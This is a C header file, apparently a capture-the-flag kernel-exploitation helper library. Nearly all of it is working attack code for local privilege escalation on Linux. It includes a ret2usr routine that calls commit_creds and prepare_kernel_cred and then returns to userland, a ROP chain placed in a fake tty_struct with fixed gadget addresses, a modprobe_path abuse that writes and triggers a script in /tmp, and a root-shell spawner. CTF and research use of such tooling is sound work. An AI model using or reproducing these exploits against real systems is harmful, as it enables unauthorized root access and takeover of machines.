// inspired by the goat: https://github.com/n132/libx/blob/main/libx.c
#define _GNU_SOURCE
#ifndef LIBPWN_H
#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <pthread.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <stdint.h>
#include <errno.h>
#include <stddef.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <assert.h>
#include <sys/timerfd.h>
#include <sys/resource.h>
#include <sys/ptrace.h>
#include <netinet/tcp.h>  // for SOL_TCP, TCP options
#include <sys/prctl.h>
#include <poll.h>
#include <sys/shm.h>

#include <sys/socket.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>


size_t kernel_base = 0xffffffff81000000;
#define KADDR(addr) ((size_t)(addr)-0xffffffff81000000 + kernel_base);
int fd;

#define TTY_FILE                        "/dev/ptmx"  
#define DEFAULT_MODPROBE_TRIGGER        "/tmp/fake"
#define DEFAULT_EVIL_MODPROBE_PATH      "/tmp/pwn"

#define SUCCESS_MSG(msg) "\033[32m\033[1m" msg "\033[0m"
#define INFO_MSG(msg) "\033[34m\033[1m" msg "\033[0m"
#define ERROR_MSG(msg) "\033[31m\033[1m" msg "\033[0m"
#define log_success(msg) puts(SUCCESS_MSG(msg))
#define log_info(msg) puts(INFO_MSG(msg))
#define log_error(msg) puts(ERROR_MSG(msg))

typedef unsigned long u64;
typedef unsigned int u32;
typedef unsigned short u16;
typedef unsigned char u8;
size_t user_cs, user_ss, user_rflags, user_sp, user_rip;
size_t leak, g_buf;

#define PTMX_SPRAY 50       // Number of terminals to allocate

typedef struct tty_struct {
    int kref; // 0
	int index; // 4
    void *dev;  // 8
    void *driver;  // 16
    void *port;  // 24
	void *ops;  // 32
	char pad[0x400 - 40];		// 40
} tty_struct_t;

tty_struct_t tty = { 0 };


void error(const char *msg){
    printf(ERROR_MSG("[!] %s\n"), msg);
    exit(-1);
}


void spawn_shell() {
    log_info("Hello from user land!");
    uid_t uid = getuid();
    if (uid == 0) {
        printf(SUCCESS_MSG("[+] UID: %d, got root!\n"), uid);
        char *args[] = {"/bin/sh", NULL};
        char *env[] = {NULL};
        execve("/bin/sh", args, env); // Directly execute a shell
        error("execve failed"); // If execve fails, print error
    } else {
        printf(ERROR_MSG("[!] UID: %d, we are root-less :(!\n"), uid);
        exit(-1);
    }
}

void save_state() {
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax");
    user_rip = (size_t)spawn_shell;
    log_success("[+] Saved state");
}


void* (*prepare_kernel_cred_kfunc)(void *task_struct);
int (*commit_creds_kfunc)(void *cred);

// ret2usr
size_t commit_creds = 0, prepare_kernel_cred = 0;

void ret2usr_attack(void)
{
    prepare_kernel_cred_kfunc = (void*(*)(void*)) prepare_kernel_cred;
    commit_creds_kfunc = (int (*)(void*)) commit_creds;

    (*commit_creds_kfunc)((*prepare_kernel_cred_kfunc)(NULL));

    asm volatile(
        "mov %%rax, %[ss]\n\t"
        "push %%rax\n\t"
        "mov %%rax, %[sp]\n\t"
        "sub %%rax, 8\n\t"     // stack alignment
        "push %%rax\n\t"
        "mov %%rax, %[rflags]\n\t"
        "push %%rax\n\t"
        "mov %%rax, %[cs]\n\t"
        "push %%rax\n\t"
        "mov %%rax, %[rip]\n\t"
        "push %%rax\n\t"
        "swapgs\n\t"
        "iretq\n\t"
        :
        : [ss]"r"(user_ss),
        [sp]"r"(user_sp),
        [rflags]"r"(user_rflags),
        [cs]"r"(user_cs),
        [rip]"r"(spawn_shell)
        : "rax"
    );
}



void rop_commit() {
  size_t swapgs_ret = KADDR(0xffffffff8200180c);
  size_t iretq_ret = KADDR(0xffffffff81037263);
  size_t prepare_kernel_cred = KADDR(0xffffffff810b9c20);
  size_t pop_rdi = KADDR(0xffffffff8104b80d);
  size_t leave_ret = KADDR(0xffffffff810324e3);
  size_t commit_creds = KADDR(0xffffffff810b9970);
  size_t init_cred = KADDR(0xffffffff82a52fc0);

  size_t *fuzz = &((unsigned long *)&tty)[82];
  int i = 0;

  fuzz[i++] = 0x4141414141;
  fuzz[i++] = 0x4242424242;
  fuzz[i++] = 0x4343434343;
  fuzz[i++] = 0x4444444444;
  fuzz[i++] = 0xdeadbeefdeadbeef;
  fuzz[i++] = 0x4545454546;
  fuzz[i++] = 0x4545454547;
  fuzz[i++] = 0x4545454548;
  fuzz[i++] = 0x4545454549;
  fuzz[i++] = 0x4545454561;
  fuzz[i++] = 0x4545454562;
  fuzz[i++] = 0x4545454563;
  fuzz[i++] = leave_ret;

  fuzz[i++] = 6969;                 // junk
  fuzz[i++] = 0xcafe;               // this becomes RBP
  i += 12;                          // skip 12 slots (padding before actual ROP chain)

  fuzz[i++] = pop_rdi;
  fuzz[i++] = init_cred;
  fuzz[i++] = commit_creds;

  fuzz[i++] = swapgs_ret;
  fuzz[i++] = iretq_ret;

  fuzz[i++] = (size_t)&spawn_shell;
  fuzz[i++] = user_cs;
  fuzz[i++] = user_rflags;
  fuzz[i++] = user_sp;
  fuzz[i++] = user_ss;
  tty.ops = (void*)(g_buf + 0x290);
  ((size_t*)&tty)[0] = g_buf + 0x300 + 12 * 8;    // controlled rsp target
  ((size_t*)&tty)[1] = leave_ret; // jump to start of ROP
}

// modprobe_path attack
size_t modprobe_path;

void abuse_modprobe(char *filename) {
    struct stat st = {0};
    char *arb_exec = "#!/bin/sh\n"
    "chmod 777 /flag";

    log_info("Hello from user land!");
    if (stat("/tmp", &st) == -1) {
        log_info("[*] Creating /tmp");
        int ret = mkdir("/tmp", S_IRWXU);
        if (ret == -1) error("Failed to create /tmp");
    }
    printf(INFO_MSG("[*] Setting up reading '%s:' as non-root user...\n"), filename);

    FILE *fptr = fopen(DEFAULT_EVIL_MODPROBE_PATH, "w");

    if (!fptr) error("Failed to open win condition");
    if (fputs(arb_exec, fptr) == EOF) error("Failed to write win condition");
    fclose(fptr);
    if (chmod(DEFAULT_EVIL_MODPROBE_PATH, S_IXUSR) < 0) error("Failed to chmod win condition");

    printf(SUCCESS_MSG("[+] Wrote win condition -> %s\n"), DEFAULT_EVIL_MODPROBE_PATH);

    fptr = fopen(DEFAULT_MODPROBE_TRIGGER, "w");
    if (!fptr) error("Failed to open dummy file");

    log_info("Writing dummy file...");
    if (fputs("\xff\xff\xff\xff", fptr) == EOF) error("Failed to write dummy file");
    fclose(fptr);

    if (chmod(DEFAULT_MODPROBE_TRIGGER, S_ISUID|S_IXUSR) < 0) error("Failed to chmod win condition");

    printf(SUCCESS_MSG("[+] Wrote modprobe trigger -> %s\n"), DEFAULT_MODPROBE_TRIGGER);
    printf(INFO_MSG("[*] Triggering modprobe by executing %s\n"), DEFAULT_MODPROBE_TRIGGER);
    execv(DEFAULT_MODPROBE_TRIGGER, NULL);

    log_info("[?] Hopefully GG");
    fptr = fopen(filename, "r");
    if (!fptr) error("Failed to open results file");

    char *line = NULL;
    size_t len = 0;
    for (int i = 0; i < 8; i++) {
        uint64_t read = getline(&line, &len, fptr);
        printf("%s", line);
    }

    fclose(fptr);
}

void dump_hex(char *buf, size_t size){
    for(int i = 0; i < size/8; i++){
        printf(SUCCESS_MSG("[+] %d - 0x%016lx\n"), i, ((unsigned long *)buf)[i]);
    }
}


void ppause(){
    log_info("enter to unpause");
    getchar();
}

void info(const char *msg, unsigned long val){
    printf(INFO_MSG("[*] %s: %p\n"), msg, val);
}



#endif /* LIBPWN_H */
